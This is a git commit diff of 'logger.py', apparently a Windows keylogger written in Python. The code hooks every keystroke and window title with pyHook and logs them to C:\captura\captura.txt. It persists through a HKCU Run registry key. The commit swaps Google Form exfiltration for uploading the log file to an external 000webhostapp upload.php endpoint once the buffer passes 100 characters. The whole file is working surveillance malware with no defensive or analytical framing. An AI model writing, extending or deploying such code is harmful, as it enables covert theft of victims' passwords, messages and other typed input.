cc691961d23e43dd53781ff4232908d91f722171
Hacker4ma <hackerama@protonmail.com>
2017-10-23 21:42:56 -0200

    update

--- logger.py
+++ logger.py
@@ -1,39 +1,54 @@
 #!/usr/bin/python
+#-*-coding:utf-8-*-
 
 import pyHook
 import pythoncom
 import os
 import subprocess
+import requests
+import threading
+import time
+import urllib,urllib2
 
+data = ''
+head = ''
+dump = ''
 def OnKey(event):
+    global head
+    global data
     global window
+    global dump
     file = open('C:\\captura\\captura.txt', 'a')
+
     if event.WindowName != window:
         window = event.WindowName
-        file.write('\n' + window + ' - ' + str(event.Time) + '\n')
-    elif event.Ascii == 13:
-        file.write('<ENTER>\n')
+        head = '\n' + window + ' - ' + str(event.Time) + '\n'
+        file.write(head)
+    if event.Ascii == 13:
+        data = ('<ENTER>\n')
+        file.write(data)
     elif event.Ascii == 8:
-        file.write(' <BACK SPACE> ')
+        data = (' <BACK SPACE> ')
+        file.write(data)
     elif event.Ascii == 9:
-        file.write(' <TAB>')
+        data = (' <TAB>')
+        file.write(data)
     else:
-        file.write(chr(event.Ascii))
+        data = chr(event.Ascii)
+        file.write(data)
         file.close()
+    dump = head + data
+    print ('tamanho de dump:', len(dump))
+    if len(dump) > 100:
+        upload(fileUp)
+    return dump
 
-def remote():
-    global data
-    if len(data)>100:
-        url="https://docs.google.com/forms/d/1FAIpQLScd_RtAoqPf0Nd84lXpFC0rh-loEuPpWFnfpt8khmXmKCoOWQ" #Specify Google Form URL here
-        klog={'entry.1145925058':data} #Specify the Field Name here
-        try:
-            dataenc=urllib.urlencode(klog)
-            req=urllib2.Request(url,dataenc)
-            response=urllib2.urlopen(req)
-            data=''
-        except Exception as e:
-            print e
-    return True
+def upload(fileUp):
+	global urlFromUpload, urlFromUpShow
+	if os.path.exists(fileUp):
+		files = {'file': open(fileUp, 'rb')}
+		r = requests.post(urlFromUpload, files=files) #import requests
+
 
 def persis():
     try:
@@ -41,9 +56,12 @@ def persis():
         subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "klogger" /t REG_SZ /F /D '+conv, shell=True)
     except Exception as e:
         print e
-
+urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
+urlFromUpShow = urlFromUpload.strip('http:upload.php')
 window = None
 persis()
+fileUp = 'C:\\captura\\captura.txt'
+
 try:
     os.mkdir('C:\\captura')
 except:
@@ -53,4 +71,3 @@ hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKey
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
-
